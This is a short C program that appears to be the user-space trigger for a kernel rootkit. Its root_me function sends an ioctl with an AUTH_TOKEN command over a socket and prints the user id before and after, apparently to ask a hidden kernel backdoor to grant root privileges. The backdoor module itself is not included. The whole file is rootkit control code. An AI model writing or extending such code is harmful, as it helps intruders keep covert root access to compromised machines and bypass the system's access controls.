#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#include "constants.h"

struct rooty_args
{
    unsigned short cmd;
    void *ptr;
};


void root_me(int sockfd){
    struct rooty_args rooty_args;
    int io;

    rooty_args.cmd = 0;
    uid_t curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);

    printf("sent root cmd\n");
    io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);
}

int main ( int argc, char *argv[] )
{
    int sockfd;
    int io;
    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    root_me(sockfd);

    printf("bye..\n");
}
